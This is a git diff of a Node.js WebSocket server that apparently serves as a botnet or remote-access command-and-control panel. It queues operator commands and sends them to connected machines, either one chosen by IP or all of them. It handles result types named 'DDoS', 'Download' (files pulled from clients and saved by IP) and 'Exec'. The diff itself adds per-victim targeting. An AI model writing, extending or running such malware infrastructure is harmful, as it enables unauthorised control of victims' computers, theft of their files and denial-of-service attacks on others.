@@ -2,10 +2,11 @@ const http = require('http');
 const WebSocket = require('ws');
 
 const { save_file } = require ('./results_handlers')
+const { setup } = require ('./setup.js')
 
 const port = 3000;
-let commandQueue = [];
-let clients = [];
+let clients = {};
+
 
 const server = http.createServer((req, res) => {
     if (req.method === 'POST' && req.url === '/send-command') {
@@ -15,13 +16,14 @@ const server = http.createServer((req, res) => {
         });
         req.on('end', () => {
             const command = JSON.parse(body);
-            commandQueue.push(command);
             // Push the command to all connected clients
-            clients.forEach(client => {
-                if (client.readyState === WebSocket.OPEN) {
-                    client.send(JSON.stringify(command));
+
+            Object.keys(clients).forEach(key => {
+                if (clients[key].readyState === WebSocket.OPEN && (command.objective === key || command.objective === 'All')) {
+                    clients[key].send(JSON.stringify(command));
                 }
             });
+
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ status: 'Command received and pushed to clients' }));
         });
@@ -46,18 +48,18 @@ const wss = new WebSocket.Server({ server });
 
 wss.on('connection', (ws, req) => {
     const ip = req.connection.remoteAddress;
+
     console.log('New WebSocket connection from:', ip);
 
-
-    clients.push(ws);
+    clients[ip] = ws;
         ws.on('message', message => {
             const result = JSON.parse(message);
             switch (result.type) {
                 case "DDoS":
                     break;
                 case "Download":
-                    //console.log('Received result from client:', result);
-                    save_file(result)
+                    console.log('Received result from client: ', ip);
+                    save_file(result, ip)
                     break;
 
                 case "Exec":
@@ -78,6 +80,7 @@ wss.on('connection', (ws, req) => {
     });
 });
 
+setup();
 server.listen(port, () => {
     console.log(`Server is listening on port ${port}`);
 });
